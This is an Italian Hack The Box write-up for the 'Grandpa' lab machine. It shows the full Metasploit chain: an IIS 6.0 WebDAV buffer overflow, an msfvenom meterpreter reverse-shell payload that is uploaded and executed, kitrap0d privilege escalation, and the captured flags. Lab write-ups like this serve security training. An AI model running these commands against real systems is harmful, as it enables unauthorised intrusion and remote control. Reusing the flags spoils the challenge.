![](grandpa.png)
# Grandpa -Hack The Box Writeup

## Nmap Scan
```bash
nmap -sCV -O 10.129.2.116
```
L'analisi ha evidenziato la presenza di un server Microsoft IIS con WebDav 6.0

## Ricerca Exploit
```bash
searchsploit iis webdav 6.0
```
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
## Sfruttamento Exploit (MetasploitFramework)
```bash
search iis webdav
use 12 
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl)
set rhosts 10.129.95.233
set lhost (ip della nostra macchina)
run
```
## Migrare a una seconda shell
notiamo che la shell appena ottenuta e' instabile, per risolvere creiamo una nuova shell con msfvenom
## Msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=5555 -f exe -o shell.exe
```
## Passaggio alla nuova shell
```bash
upload /home/kali/Desktop/shell.exe C:\\WINDOWS\\Temp\\shell.exe 
```
## Avviare sessione di multi/handler
```bash
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp 
set lhost 10.10.15.161
set lport 5555
run
```
## Su meterpreter della shell precedente 4444
```bash
execute -f C:\\WINDOWS\\Temp\\shell.exe
```
# Privilege Escalation
```bash
background
search local_exploit
use 0
set session <id della sessione con la 5555>
run
```
gli exploit ioctl e kitrap0d ci fanno scalare i privilegi a root
```bash
use exploit/windows/local/ms10_015_kitrap0d
set session <id sessione 5555>
set lhost <lhost>
set lport 3000
run
```
# Recupero Flag
## Harry (User Flag):bdff5ec67c3cff017f2bedc146a5d869
## Administrator (Root Flag):9359e905a2c35f861f6a57cecf28bb7b
